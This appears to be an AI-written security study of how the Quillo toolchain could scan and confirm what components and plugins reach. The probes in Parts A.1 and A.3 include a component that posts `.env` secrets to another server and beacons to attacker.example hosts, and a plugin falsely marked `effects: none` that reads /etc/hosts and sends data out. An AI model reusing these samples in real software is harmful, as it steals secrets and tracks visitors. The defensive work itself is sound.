# Feedback from studying a scan of components and plugins for the paths and addresses they reach, confirmed once per project

| | |
|---|---|
| App | None of its own: a study done at the user's request, 2026-11-21: "make a study about quillo scanning components and plugins for paths and url and let the user confirm them, check once per project" |
| Quillo | The released `quillo 0.8.9 (77ffcd0, 2026-11-20)` on the PATH (= tag v0.8.9). The guide and `src/policy.rs`, `src/install.rs`, `src/interp.rs`, `src/lsp.rs` were read at this checkout (branch `feedback72-81`, `439837f`) and at the tag, not built |
| Model | Claude (Fable 5.2, `claude-fable-5-2`) |
| Tested with | `quillo check`, `quillo run`, `quillo build` and `quillo install` on macOS, with curl and a small Python server standing for "another server". A prototype scanner, `scan.py` (Python, patterns over the text, with comments and strings told apart; not Quillo's parser), run over the catalog's 632 plugins (`~/dev/quillo-website/plugins`, `c8dc42b`), the kit's 878 files (`~/dev/quillo-components/ui`, `f28a0c2`) and the 175 `.qwe` files of this repository's apps (`app/`). Nothing ran in a browser. All of it is kept in `.git/wip/feedback83/` (`scan.py`, `plugins.json`, `kit.json`, `apps.json`, `probe/`, `probe2/`, `probe3/`, `inst/`) |

Numbers Q-1300 to Q-1308, from the block Q-1300 to Q-1319 (FEEDBACK82 holds Q-1280 to Q-1299). This is a report only: no code, `feedback/INDEX.md` or `feedback/repros/` was changed. The repros are written in the report.

**How the request is read.**

- **A component** is a `.qwe` file taken into a program for what it shows: one of the kit's 877, or any file copied from elsewhere. **A plugin** is a `.qwer` or `.rs` file, Rust, from the catalog (`quillo install`) or from elsewhere.
- **Paths and addresses** are what such a file reaches outside itself: files and folders on the server, hosts the server calls (`http.*`), and the hosts a page sends a visitor's browser to (scripts, images, `fetch`). "URL" is written "address" below, as the guide writes it.
- **Scanning** is reading the file's text for them, without running it. **Confirming** is the developer saying yes to the list.
- **Once per project** is read as: the answer is kept with the project. It is asked once, not at every start and not again on each machine, and asked again only for what is new. The other reading, "look once and never again", is not taken: a file that changes after the yes is the case that matters most (Part D.3).

What worked well (measured, unless said):

- **The checker already knows effects by file and line.** Under a policy without `fs` and `http`, `quillo check` named each call of a taken file: ``./kit/badge.qwe:4: error: `read_file` needs the fs effect, which effects.policy does not allow``. A scan can stand on this: the walk that knows a call needs `http` can read the address the call is given.
- **`[http] hosts` holds a taken file as it holds the program.** Under `hosts = ["api.example.com"]`, the taken file's post at start never reached the other server.
- **The running program knows the file each call is written in.** A runtime error in the taken file's route was logged as `kit/badge.qwe:16: division by zero` (`cur_file` in `src/interp.rs`). So a list kept per file can be held per file.
- **The kit's components stay in the browser.** None of its 878 files has a `server fn`, a route, an `http.*` call, a file call, `env()` or a Rust `use`.
- **`quillo install` refuses a download whose SHA-256 is not the catalog's**, and says when a file here "differs from the catalog's: changed by hand?".
- **No catalog plugin takes a crate from git or from a path.** All 574 that name crates name them by version.
- **The editor already asks once per folder.** The VS Code extension runs `cargo check` on a `.qwer` only in a folder its Workspace Trust has confirmed (the guide; not run here).
- **Comparing is cheap.** SHA-256 over all 878 kit files (10.3 MB) took 15 ms. `quillo check` of the gallery that uses them all took 0.87 to 1.9 s (3 runs, on a busy machine).

## The answer

**Yes to the scan, on two conditions. A scan lists only what is written out, so something must hold the program to the list. And Rust cannot be held, so confirming a plugin has to mean confirming one exact file, by its hash.**

Today nothing lists what a program's files reach, in any command (Q-1300). Measured on 0.8.9: a component file taken for one name posted the program's `.env` to another server as the program started, added a route that serves it, and put a script and an image from other hosts into the page. `quillo check` said `ok`.

What a scan can do, by kind of file (Part B has the numbers):

| | What a scan lists | What it misses (measured) | What can hold the file to its list |
|---|---|---|---|
| Server code in a `.qwe` file: `http.*`, service calls, `read_file` and the other file builtins | the address or path, where it is written at the call | an address handed through a helper or worked out. The `stays` app writes 4 hosts: 1 is at its `http.get`, 3 reach it through `fetch_json(url)`, and one of those is a default in `env("STAYS_OVERPASS", "https://…")` | **Quillo, completely.** Every `http.*` call and redirect already passes `policy.http`, and every path already passes the folder rule. An address that was worked out is then refused, or asked about, as it is used |
| A page: `client` scripts, `src` and `href`, `url()` in CSS, `fetch` through `js()` | scripts (3 kit files), what the page loads, links | a default handed on as a prop (4 kit files: map tiles, a video host), an address put together in the browser (13 kit files) | **The browser, by a `content-security-policy` Quillo writes from the list**, and a script's content by an integrity hash. Neither exists today (Q-1303, Q-1304) |
| A plugin (Rust) | the addresses and paths written in its file, the calls it makes (files, sockets, the environment, starting programs), its crates, the variables it reads | 53 of the 196 plugins that reach the network write no address: it is the caller's. 85 of the 118 that write one let a variable replace it. What its crates do (574 plugins name crates, 322 different ones) | **Nothing.** The guide: "A plugin is Rust in the server's process, which a policy cannot watch". Confirming can only pin the file by its SHA-256, checked at each start |

**My recommendation, in this order:**

1. **`quillo confirm`, and a file `quillo.confirmed` beside `main.qwe`** (Part D): the list by file, over every file of the program (decided by the user, question 1), written by Quillo, committed with the project. That is what makes it once per project. `.quillo/` is ignored by git in `quillo new`'s programs, so an answer kept there would be asked again on every clone.
2. **Ask only for what is new.** A `.qwe` file is asked about again when its list grows, not each time it is edited. A plugin is asked about again when its file changes, since its list proves nothing about the rest of it.
3. **Hold what can be held (decided, question 2).** Server code is held to the confirmed hosts and folders, at the call. Pages get a CSP made from the list, report-only first, so nothing breaks before the list is complete. A plugin loads only at its confirmed hash, which also answers FEEDBACK82's Q-1285.
4. **Never ask where no one can answer, and refuse what is not confirmed (decided, question 3).** A terminal is asked. CI, systemd, FastCGI and containers are not: `quillo check` fails, and `quillo run` refuses the unconfirmed call as it is reached, with a log line. Under a provider's policy the program does not start at all until its `quillo.confirmed` is complete (decided, question 5).
5. **The catalog and the kit carry their own lists (decided, question 4).** Each catalog plugin gets its `//! effects:` line and its list when it is published (Q-1306). `quillo install` shows them, and one key confirms.
6. **Fix what the study found on the way, whatever is decided:** `quillo check` holding written addresses to `[http] hosts` (Q-1302), a warning where a file taken for a component also adds routes or works at start (Q-1301), and the plain disagreement between `effects: none` and the code (Q-1305).

## Part A: what 0.8.9 does today

### A.1 A component file taken from elsewhere (`probe/`)

```quillo
// main.qwe
import kit/badge.qwe use Badge

route GET / = <html><body><h1>Shop</h1><Badge label="new"/></body></html>
```

```quillo
// kit/badge.qwe: the file taken
client "https://cdn.attacker.example/x.js" use X

let started = http.post("http://127.0.0.1:47831/boot", { body: read_file(".env") ?? "no .env" })

route GET /kit-debug = read_file(".env") ?? "none"

component Badge(label) {
    <span onmount={(el) => {
        js("fetch", "https://collect.attacker.example/c?" + str(js("document.title")))
        X.track(label)
    }}>
        {label}<img src="https://pixel.attacker.example/p.gif" alt=""/>
    </span>
}
```

`.env` holds `STRIPE_KEY=sk_live_probe_not_real`. A Python server on `127.0.0.1:47831` stands for another server.

| Step | Result |
|---|---|
| `quillo check main.qwe` | `main.qwe: ok (2 routes, 0 functions, 1 component, in 2 files)` |
| `quillo run main.qwe` | the other server logged `POST /boot body={"body":"STRIPE_KEY=sk_live_probe_not_real\n"}` before any request came |
| `GET /kit-debug` | `STRIPE_KEY=sk_live_probe_not_real` |
| `GET /` | the page's loader names `https://cdn.attacker.example/x.js`, and the markup has `src="https://pixel.attacker.example/p.gif"` |
| The answer's headers | `x-frame-options`, `x-content-type-options`, no `content-security-policy` |

The main file asked for one name, `Badge`. It got the file's top-level statement and its route as well, since a file taken runs whole.

### A.2 The same program under a policy

| Policy | `quillo check` | `quillo run` |
|---|---|---|
| `quillo.policy`: `[http] hosts = ["api.example.com"]` | `ok`. The written address `http://127.0.0.1:47831` is not held to the hosts | the post was refused (the other server saw nothing), as an error value in a `let` that nothing reads. No log line. The page still carried the script and the image |
| `--policy effects.policy`: `[effects] allow = ["db", "time", "random"]` | 3 errors, each with the taken file and line: `` ./kit/badge.qwe:4: error: `http.post` needs the http effect, which effects.policy does not allow `` | — |

So the policy can hold a taken file's server calls, by effect and by host. What is missing is the list: a developer learns which hosts a file wants only by reading it, or by a refusal no log shows (Q-1302). Nothing in a policy speaks of the page's addresses (Q-1303).

### A.3 A plugin whose header says it does nothing (`probe2/`)

```rust
//! Says hello.
//! version: 1.0.0
//! effects: none

use std::io::{Read, Write};

/// A greeting for `name`.
pub fn greet(name: &str) -> String {
    let hosts = std::fs::read_to_string("/etc/hosts").unwrap_or_default();
    if let Ok(mut s) = std::net::TcpStream::connect("127.0.0.1:47831") {
        let body = format!("lines={}", hosts.lines().count());
        let _ = write!(s, "POST /from-plugin HTTP/1.1\r\nhost: x\r\ncontent-length: {}\r\nconnection: close\r\n\r\n{}", body.len(), body);
        let mut b = String::new();
        let _ = s.read_to_string(&mut b);
    }
    format!("hello, {}", name)
}
```

```quillo
import reach.qwer use greet

route GET / with time = greet("Ana")
```

Under `strict.toml` (`[effects] allow = ["time"]`, `[http] private = false`, `hosts = ["api.example.com"]`):

| Step | Result |
|---|---|
| `quillo check main.qwe --policy strict.toml` | `quillo: policy strict.toml (effects: time; no private addresses)`, then `ok` |
| `GET /` | `hello, Ana`, and the other server logged `POST /from-plugin body=lines=9`: a file outside the program's folder read, and a private address reached |
| `scan.py` on `reach.qwer` | header `effects: none`; calls: files, network; written: `/etc/hosts`, `127.0.0.1:47831` |

The guide says this plainly: the line "is the file's word, not a proof". What the probe adds is that a reading of the text catches this case, where the word and the code plainly disagree (Q-1305).

### A.4 A plugin from the catalog (`inst/`)

| Step | Result |
|---|---|
| `quillo install airtable escpos` | `installed airtable 1.0.0 into ./airtable.qwer`. Nothing about what either reaches, and no file written that records their hashes |
| A call into `escpos` under a policy that narrows effects at all (even `db, http, fs, time, random, env`) | `` error: `escpos_receipt` is Rust whose file does not say what it does, so it may do anything and is refused here: put `//! effects: ...` (or `//! effects: none`) at the top of escpos.qwer `` |
| The developer adds `//! effects: http, env` to `airtable.qwer`, as the message and the guide say | `check` passes. `quillo install airtable` and `--update` now say `kept airtable 1.0.0 here differs from the catalog's: changed by hand? --force replaces it` |
| A function that reads `/etc/hosts` appended to `escpos.qwer` | `quillo check main.qwe`: `ok (1 route, 14 functions, …)`. Only `quillo install escpos` notices |

## Part B: what a scan finds in the real files

`scan.py` strips comments, takes string literals apart from code, and looks for addresses (`scheme://host`), bare hosts, absolute paths and the calls that reach outside. It took 1.5 s for the 632 plugins and 1.9 s for the 878 kit files, in Python. A scan built into Quillo would read the `.qwe` side off the program it has already parsed.

### B.1 The catalog's 632 plugins

| | Plugins |
|---|---|
| With a `//! version:` line | 632 |
| With a `//! effects:` line | **0** |
| Name crates | 574 (322 different crates; 2 at the median, 14 at most, in `grpc`). From git or a path: 0 |
| Reach the network (a socket or an HTTP crate) | 196 |
| … and write no address at all: it is the caller's (printers, protocols, `discord`, `shopify`, `kubernetes`) | 53 of the 196 |
| Write an address with a host | 118 (188 different) |
| … of which a real outside host (`api.stripe.com`) | 83. The other 35 have only placeholders or this machine (`amqp://host:5672`, `https://your-team.atlassian.net`, `http://localhost:9200`) |
| … of which a variable can replace it (`AIRTABLE_API_URL`, `APNS_HOST`) | 85 |
| Write an address whose host is filled in as it runs (`https://{}.…`) | 72 |
| Use the file system | 223, of which 113 can write |
| … and write an absolute path | 20 (`/dev/` in 12 printer plugins, `/etc/resolv.conf`, `/etc/hostname`, `/var/run/secrets/kubernetes.io/serviceaccount`). In the rest the path is the caller's |
| Read environment variables | 125 |
| Start a program | 3 (`cli_run`, `ffmpeg_cli`, `git_cli`) |
| Use `unsafe` | 2 |
| None of the above: they only compute | 256 |

The effects line a scan would propose, by its most common results: `none` 212, `fs` 145, `http, env, time` 62, `time` 37, `http, fs, env, time` 21, `random` 16.

**What this says about confirming a plugin's addresses.** For 83 plugins the list would name a real host, and for 85 of the 118 a variable in `.env` moves the traffic elsewhere. For 53 the list would be empty though the plugin reaches the network. So a plugin's list is a reading aid. What can be confirmed is the file.

### B.2 The kit's 878 files

| | Files |
|---|---|
| With server code (`server fn`, a route, `http.*`, a file call, `env()`, a Rust `use`) | 0 |
| Load a script from another host (`client "https://cdnjs.cloudflare.com/…/leaflet.min.js"`) | 3 (`map_view`, `map_sheet`, `pin_dropper`), which also load its stylesheet from there |
| Hold an address as a default that is handed on | 9: the 3 map components' tiles (`tile.openstreetmap.org`), `youtube_embed` (`i.ytimg.com`, `www.youtube-nocookie.com`), and 5 with `example.com` samples |
| Write addresses in text, mostly share links a visitor follows (`t.me`, `wa.me`, `x.com`, `www.linkedin.com`) | 6 |
| Put an address together in the browser (`"https://" + host`) | 13 |
| Write only a format's name (`http://www.w3.org/2000/svg`) | 9 |
| Call the browser through `js()` | 274 (1,596 calls) |
| … naming `fetch` | 3: one to the page's own address, two to a `src` the program gives |
| … naming the camera or microphone, the place, the clipboard, storage | 10, 8, 26, 46 (files that name them, comments included) |

So a kit component's reach is the visitor's browser. In 4 of the 878 files there is another host to confirm: the 3 map components (a script, a stylesheet and tiles) and `youtube_embed` (2 hosts). Six more write links, and 13 put an address together in the browser, which only the browser's own report can list (D.4). What a component asks of the browser itself (camera, place, clipboard) is not a path or an address, but the same scan sees it at no added cost.

### B.3 This repository's apps (175 files)

39 files have server fns (260 of them) and 13 have routes (114). One `http.*` call has its address written (`stays`: `nominatim.openstreetmap.org`), and one takes it from a parameter. File calls: 3 with a written folder (`pages/`), 2 files with a worked-out path (uploads). An honest list for `stays` would be 4 hosts and 2 folders. The prototype placed 1 host at a call.

### B.4 What the prototype got wrong

| Read as | Really | How often |
|---|---|---|
| an address | a format's name, which nothing connects to (`http://www.w3.org/2000/svg`, `http://schemas.xmlsoap.org/…`) | the only addresses in 26 plugins and 9 kit files |
| an address | a placeholder in a message, or this machine | the only addresses in 35 of 118 plugins |
| an address | a comment | 163 addresses in the comments of 102 plugins (a plain `grep` counts them) |
| a host | an object identifier (`2.5.4.3`) | 3 plugins (`asn1_der`, `ocsp`, `pkcs12`) |
| starting a program | clap's `Command::new`, which reads arguments (`cli_args`) | 1 of 4 |
| a path | a word the plugin looks for in its input (`nginx_conf`'s `/root`, `dockerfile`'s `/bin/sh`), or a place inside JSON (`grafana`'s `/data/values`) | 3 of 20 |
| a listening socket | a UDP socket bound to send from (`0.0.0.0:0`) | 18 of 19 |
| nothing | an address in a caller, reaching `http.get` through a helper (`stays`) | 3 of 4 hosts |

Quillo's own parser removes the `.qwe` noise: it knows a comment from a string, an attribute from text, and which call a string is given to. Following a written address through a helper's parameter is the checker's kind of work, and will not always succeed. For Rust a scan needs at least a tokenizer, and it still guesses.

## Part C: how others do it

From each one's documentation, not run here.

| Who | What is confirmed | Kept where | Asked again | Held at run time? |
|---|---|---|---|---|
| Deno | network hosts, paths, environment names, programs to start, per run | flags or the project's config. A terminal is asked at first use | each run, unless granted in the config | yes, the whole process, not per module |
| pnpm 10 (`approve-builds`), Bun (`trustedDependencies`) | which dependencies may run their install scripts | the project's own file, committed | for a new dependency | the script does not run |
| Composer (`allow-plugins`) | which plugins may run code during install | `composer.json`, committed | for a new plugin. With no terminal it is refused, not asked | the plugin does not load |
| VS Code Workspace Trust | the folder as a whole | the user's settings, not the project | on each machine | features are off until trusted |
| direnv (`direnv allow`) | one `.envrc`, by its content | the user's machine, by hash | whenever the file changes | the file does not load |
| Browser extensions, Android | hosts and device powers the author declares | the manifest | when an update asks for more | yes, by the platform |
| LavaMoat (MetaMask) | what each npm package uses of the platform (`fetch`, `fs`), found by reading its code | a policy file in the project, committed and reviewed, with an override file for what the reading missed | when the generated policy changes | yes, per package |
| Capslock (Go) | what each package can do (network, files, starting programs), found by reading its code | a report | — | no |
| cargo-vet | that a person read this crate at this version | the project's audit files, committed | for a new version | the check fails in CI |

What they agree on:

- **The answer lives in the project and is committed.** Tools that keep it on the user's machine ask again on each clone.
- **With no terminal, refuse. Never wait for an answer.**
- **Ask again only when the list grows.**
- **A list read from code misses things.** The ones that hold their list at run time (Deno, LavaMoat) are trusted for it. The one that only reports (Capslock) says so.
- **For compiled code that nothing can watch, what is confirmed is one version of the file** (direnv, cargo-vet).

## Part D: the design proposed

A sketch. The names are open.

### D.1 The file

`quillo.confirmed`, beside `main.qwe`, where `quillo.policy` and `.env` are. Written by Quillo, read by people, committed.

```toml
# quillo.confirmed: what this program's files reach, as confirmed.
# Written by `quillo confirm`. Commit it: the answer is the project's.

["ui/map_view.qwe"]
scripts = ["https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.js sha384-…"]
loads   = ["cdnjs.cloudflare.com", "tile.openstreetmap.org"]

["lib/outside.qwe"]
http = ["nominatim.openstreetmap.org", "api.open-meteo.com", "photon.komoot.io", "overpass-api.de"]

["lib/uploads.qwe"]
files = ["uploads/"]

["airtable.qwer"]
sha256  = "…"                     # this exact file: the catalog's airtable 1.0.0
effects = "http, env, time"
http    = ["api.airtable.com"]    # written in it; AIRTABLE_API_URL replaces it
env     = ["AIRTABLE_TOKEN", "AIRTABLE_API_URL"]
crates  = ["ureq 2", "serde_json 1"]
```

It only narrows, as a policy does: a host confirmed here that `quillo.policy` or the host's policy refuses stays refused, and `quillo confirm` says so.

### D.2 What the developer sees

```
$ quillo confirm
quillo: 2 files reach something not confirmed yet

  kit/badge.qwe
    posts to      http://127.0.0.1:47831           line 4, as the program starts
    reads         .env  (the program's settings)   lines 4, 6
    adds a route  GET /kit-debug                   line 6
    page script   https://cdn.attacker.example/x.js           line 2
    page loads    https://pixel.attacker.example   line 13
    page calls    fetch https://collect.attacker.example      line 10

  reach.qwer  (Rust: Quillo cannot hold it to this list, only to this file)
    says          effects: none
    but calls     std::fs::read_to_string, TcpStream::connect  lines 9, 10
    written       /etc/hosts, 127.0.0.1:47831

  [y] confirm all   [f] file by file   [n] none   [s] show the lines
```

| Where | When something is not confirmed |
|---|---|
| `quillo confirm` | lists everything by file, asks, writes `quillo.confirmed`. `quillo confirm lib/` takes a folder at once |
| `quillo run` on a terminal, `--watch` too | asks about the new item only, then goes on |
| `quillo check` | lists them, and exits 1 once the project has a `quillo.confirmed` |
| A start with no terminal (CI, systemd, FastCGI, a container) | never asks. What is not confirmed is refused as it is reached, and a plugin stops the start (decided, question 3) |
| Under a provider's policy | a program with no `quillo.confirmed`, or with anything not confirmed, does not start (decided, question 5: asked by the provider's own layers only, as revised on 2026-11-23; one release warns first, question 6) |
| A project with no `quillo.confirmed`, and no policy in force | runs as today, with one line: `quillo: 6 addresses and 1 path in 2 files are not confirmed: quillo confirm lists them` |
| The editor | a note at the line, with the action "confirm" |
| `quillo install airtable` | shows the catalog's list for the plugin and asks. A yes writes its block and hash |

### D.3 What "asked again" means

| File | Asked again when | Not asked when |
|---|---|---|
| `.qwe` | its list grows: a new host, folder or script, or a confirmed script's content changes | it is edited and reaches nothing new. Quillo holds it to the list, so the list is the promise |
| `.qwer`, `.rs` | the file's SHA-256 changes. The prompt shows what changed in its list | never otherwise. Nothing holds Rust to a list, so the file is the promise |

An item no longer in the file leaves the list at the next `quillo confirm`. A list never grows by itself.

### D.4 What can hold the list

| What | Held by | Exists today? |
|---|---|---|
| `http.*`, `site` and service calls | the confirmed hosts of the file the call is written in, checked where `policy.http` is checked now, redirects too | the check, yes. The per-file list, no |
| File builtins | the confirmed folders, inside the program's folder rule and `--allow-path`. `.env`, `quillo.policy` and database files are named in the prompt when a file reads them | the folder rule, yes |
| `client`, `preload`, `preconnect` scripts | `script-src` in a CSP, and `integrity` with the hash taken at confirming | no (Q-1303, Q-1304) |
| What a page loads and calls (`src`, `url()`, `fetch`) | `img-src`, `style-src`, `font-src`, `frame-src`, `connect-src` | no |
| An address worked out in the browser | in development, the browser's CSP reports are read by Quillo and offered for confirming: this finds what the scan cannot | no |
| An address worked out on the server | on a terminal, asked at first use, as Deno asks. With none, refused and logged | no |
| A plugin | loaded only at its confirmed hash | the hash of the built library, yes (`.quillo/plugins.lock`). The source's, no (Q-1307) |

A CSP written by Quillo can break a page that has inline scripts of its own or a widget from elsewhere. So it starts as `content-security-policy-report-only`, and is enforced when the developer says so. A program's own `site_headers` policy stays the program's.

### D.5 What a start costs

- **Plugins:** each start already hashes each Rust file's text to find its library. Comparing that with `quillo.confirmed` adds a lookup.
- **`.qwe` files:** the list is read off the program as it is parsed, then compared. For scale: hashing all 878 kit files took 15 ms, against 0.87 s at best for checking them.
- **Each request:** one host comparison at an `http.*` call, where the policy's is made now, and one header on a page. By the rule that no change slows Quillo, both are measured with the in-process bench and `bench/cyc.py` before anything lands, old binary against new.

## New issues

### Q-1300. Nothing lists what a program's files reach: a component file taken for one name posts `.env` to another server at start, and `quillo check` says `ok`

| Kind | Detected by | Attempts |
|---|---|---|
| limitation; security | `quillo check`, `quillo run`, curl, a stand-in server | 1 |

Measured in A.1. No command prints the hosts, paths, scripts or routes that each file brings. `quillo check` reports counts (`2 routes, 0 functions, 1 component, in 2 files`), `quillo docs` the routes. The kit is copied a file at a time with `curl`, and plugins with `quillo install`: both are code from elsewhere that the developer is asked to read.

| Impact | |
|---|---|
| **Functionality** | No change to what runs. There is no way to ask "what does this file reach?" short of reading it |
| **User** | A developer who takes 30 kit files and 5 plugins has 35 files to read, and again at each update |
| **Requests** | No change |
| **Security** | A taken file has the program's whole reach: its `.env`, its database, every host. Nothing shows when an update of it starts to use that |

**Suggestion:** Part D: `quillo confirm` and `quillo.confirmed`, over every file, held, and refused where not confirmed (decided, questions 1 to 3). As a first slice, `quillo check --reach` prints the list by file.

### Q-1301. A file taken for one name runs whole: its top-level statements at start, and its routes

| Kind | Detected by | Attempts |
|---|---|---|
| silent; security | `quillo run`, curl | 1 |

`import kit/badge.qwe use Badge` takes one name. The file's `let started = http.post(...)` ran as the program started, and its `route GET /kit-debug` answered. This is how files work ("A file `use`d twice, or by several files, runs once"), and a library needs it for its own `let`s. But nothing tells the main file's author that a file taken for a component also serves an address or works at start.

| Impact | |
|---|---|
| **Functionality** | A program serves routes its main file never wrote. A taken file's route can also stand in front of the program's own: with `route GET / = "taken over by kit/badge.qwe"` in the taken file, `GET /` answered that, not the main file's page (`probe3/`) |
| **User** | For a new address, `quillo check` counts `2 routes` where the main file has 1, and that count is the only sign. For an address the program also has, check does warn: ``main.qwe:3: warning: this route is never reached: `GET /` (kit/badge.qwe:1) takes every request it would``, and the program starts all the same |
| **Requests** | An address the developer does not know of answers (here with `.env`) |
| **Security** | A way in that no one reviewed, behind no middleware of the program's choosing |

**Suggestion:** `quillo check` warns where a file that is only imported for names also declares routes, jobs or middleware, or makes calls with effects at its top level: `kit/badge.qwe is taken for Badge, and also adds GET /kit-debug and posts to another server as the program starts`. The confirm prompt lists both (D.2).

### Q-1302. `quillo check` does not hold a written address to the policy's `[http] hosts`, and the refusal at run time is an error value with no log line

| Kind | Detected by | Attempts |
|---|---|---|
| silent | `quillo check`, `quillo run`, a stand-in server | 1 |

Under `quillo.policy` with `hosts = ["api.example.com"]`, `quillo check` said `ok` for `http.post("http://127.0.0.1:47831/boot", …)`, an address written out in full. At run time the post was refused, as an error value in a `let` nothing reads, and the log had no line about it. The guide says `quillo check --policy` "says, before a deploy, what the program would be refused, as errors". It does so for effects (A.2), not for hosts.

| Impact | |
|---|---|
| **Functionality** | A call that can never succeed under the policy passes check |
| **User** | The developer learns of it when a feature fails in production, with nothing in the log unless their code prints the error |
| **Requests** | The request that needed the call fails or shows less |
| **Security** | The refusal itself is right. But an attempt to reach a host the policy refuses is worth a line, and there is none |

**Suggestion:** where an `http.*` call's address is written out (a string, or a template whose host is written), `quillo check` holds its host to the policy's hosts as an error, with the file that refuses it. At run time, the first refusal for each host is logged once, as a path that leads out of the folder is.

### Q-1303. A page's addresses are outside every policy, and Quillo writes no `content-security-policy` of its own

| Kind | Detected by | Attempts |
|---|---|---|
| limitation; security | curl (headers and the page's HTML); not run in a browser | 1 |

`[http] hosts` covers `http.*`, `site` calls and push. Under `hosts = ["api.example.com"]` the page still named `https://cdn.attacker.example/x.js` in its loader and `https://pixel.attacker.example/p.gif` in its markup, and the answer had no `content-security-policy`. A component's script runs in every visitor's page with the page's rights: it reads what the page shows and sends it where it likes.

| Impact | |
|---|---|
| **Functionality** | A policy cannot say which hosts a program's pages may load from or call |
| **User** | A site owner who narrows the server to one host has narrowed nothing in the browser. A CSP must be written by hand in `site_headers` and kept up to date with every component taken |
| **Requests** | No change on the server. Each visitor's browser makes the extra requests |
| **Security** | A taken component can load code from any host into the page, and can report each visitor to any host by an image or a `fetch` |

**Suggestion:** Quillo already knows a page's `client` scripts and its markup. It can write the CSP's sources from the confirmed list (D.4), report-only first, and add to a program's own `site_headers` policy nothing it did not ask for.

### Q-1304. A `client` script from another host carries no integrity hash

| Kind | Detected by | Attempts |
|---|---|---|
| limitation; security | the page's HTML, the guide; not run in a browser | 1 |

The page loads each `client` address with a script element whose `src` is the address, and nothing more. The guide says to "pin its version", and has no word on `integrity`. Three kit components load Leaflet from `cdnjs.cloudflare.com` this way. The address names a version. The bytes are whatever the host sends that day.

| Impact | |
|---|---|
| **Functionality** | No way to say "this script, exactly" |
| **User** | A developer who confirmed an address has confirmed a name |
| **Requests** | No change |
| **Security** | A changed file at the CDN, or a CDN taken over, runs in every visitor's page |

**Suggestion:** confirming a script fetches it once and keeps its SHA-384 in `quillo.confirmed`, and the page writes `integrity` and `crossorigin`. A changed script then fails to load in the browser and is asked about again at the next `quillo confirm`. A hand-written form too: `client "…" integrity "sha384-…" use L`.

### Q-1305. A plugin's `//! effects:` line is not compared with its code, even where they plainly disagree

| Kind | Detected by | Attempts |
|---|---|---|
| security | `quillo check`, `quillo run`, a stand-in server, `scan.py` | 1 |

Measured in A.3: `//! effects: none` over a function that calls `std::fs::read_to_string("/etc/hosts")` and `TcpStream::connect`. It passed `quillo check` under a policy that allows only `time`, and on each request read the file and reached a private address. The guide says the line is "the author's claim, read as a promise". New here: a reading of the text finds this case in milliseconds.

| Impact | |
|---|---|
| **Functionality** | `with`, and a policy's `[effects]`, hold Rust by a line anyone can write |
| **User** | The refusal message itself offers the way through: ``put `//! effects: ...` (or `//! effects: none`)`` |
| **Requests** | No change |
| **Security** | A plugin that says `none` runs anywhere, under any policy, with the server's whole reach |

**Suggestion:** `quillo check` reads each Rust file's own text for the calls that mean an effect (`std::fs`, `File::`, sockets, HTTP crates, `std::env::var`, clocks, random sources) and warns where the line leaves one out: `reach.qwer says effects: none, and calls std::fs::read_to_string (line 9) and TcpStream::connect (line 10)`. It stays a reading, not a proof: a crate can do the work unseen, and the message says so.

### Q-1306. No catalog plugin has an `//! effects:` line, so under any policy that narrows effects each one needs a hand edit, which `quillo install` then calls "changed by hand"

| Kind | Detected by | Attempts |
|---|---|---|
| loud, then silent | `quillo check --policy`, `quillo install` | 1 |

0 of the 632 have the line. Measured in A.4: under a provider's policy that leaves out only `net`, a call into `escpos` is refused, and the fix asked for is to edit the file. After the edit, `quillo install` and `--update` keep the file as "changed by hand", so it gets no updates without `--force`, which removes the line again. The guide knows the first half ("The catalog's files do not have it yet: add it to your copy").

| Impact | |
|---|---|
| **Functionality** | On a host with a policy, the catalog does not work as installed |
| **User** | Each developer works out each plugin's effects alone, and loses updates for it |
| **Requests** | No change |
| **Security** | The line is written by whoever wants the error gone, not by whoever read the plugin. An edited copy also no longer matches the catalog's hash, so it cannot be pinned (FEEDBACK82's Q-1285) |

**Suggestion:** the catalog's files carry the line, proposed by the scan (B.1: `none` for 212, `fs` for 145, `http, env, time` for 62) and read by a person before publishing, the ones that reach the network or start programs first (decided, question 4). Until then, `quillo install` does not call a copy changed when only that line was added.

### Q-1307. `quillo install` checks a plugin's hash and keeps it nowhere, so a plugin changed afterwards passes `check` and `run` without a word

| Kind | Detected by | Attempts |
|---|---|---|
| silent; security | `quillo install`, `quillo check` | 1 |

After `quillo install`, the folder holds the `.qwer` files and nothing else. A function reading `/etc/hosts` appended to `escpos.qwer` gave `ok (1 route, 14 functions, …)` from `quillo check`, and a start would build and load it. `.quillo/plugins.lock` records the built libraries, is rewritten by every build, and sits in a folder `quillo new` tells git to ignore. FEEDBACK82's Q-1285 is the policy's side of this (`allow` goes by name). This is the project's side: no committed file says which plugin files it was built on.

| Impact | |
|---|---|
| **Functionality** | A project cannot say "these plugin files, exactly" |
| **User** | A changed plugin in a pull request is seen only if someone reads the diff of a 10 KB Rust file |
| **Requests** | No change |
| **Security** | Rust that no one confirmed runs in the server's process at the next start |

**Suggestion:** the `sha256` in each plugin's block of `quillo.confirmed` (D.1), written by `quillo install` and `quillo confirm`, compared at each start. A provider's `allow = ["qr@sha256:…"]` can then name the same hash.

### Q-1308. No effect names starting a program, so the three catalog plugins that do can only understate

| Kind | Detected by | Attempts |
|---|---|---|
| limitation, small | `scan.py`; the guide's list of effects | 1 |

The effects are `db`, `http`, `fs`, `env`, `time`, `random` and `net`. `cli_run`, `ffmpeg_cli` and `git_cli` start programs with `std::process::Command`. An honest header for them has no word to use, and a policy has no way to refuse them but by name.

| Impact | |
|---|---|
| **Functionality** | `with` and `[effects]` cannot tell a plugin that reads a file from one that runs `sh` |
| **User** | A provider that wants no account to start programs lists plugins by hand |
| **Requests** | No change |
| **Security** | Starting a program is the widest reach there is, and the only one without a name |

**Suggestion:** an effect `run` (or `process`), declared in a Rust file's header and allowed or not by a policy. Quillo code has no builtin that needs it, so nothing else changes. `--with` could be held by the same word (FEEDBACK82's Q-1280).

## Where the AI struggled

| What I did first | Why | What happened | Cost |
|---|---|---|---|
| Counted the kit's files with a `server fn` by `grep` | the fastest way | 44, every one in a comment or in text. With comments skipped: 0 | a wrong number nearly written down |
| Took `Command::new` for starting a program | the usual name | `cli_args` uses clap's, which reads arguments | 1 false match of 4 |
| Read `2.5.4.3` as an address | the pattern for IPv4 | object identifiers in 3 plugins | noted in B.4 |
| Expected a policy with `[effects]` to refuse a program that takes a plugin with no effects line | the guide: "refused anywhere under it" | it is refused at each call, as the guide's next words say. A plugin taken and never called passes | 1 more probe |
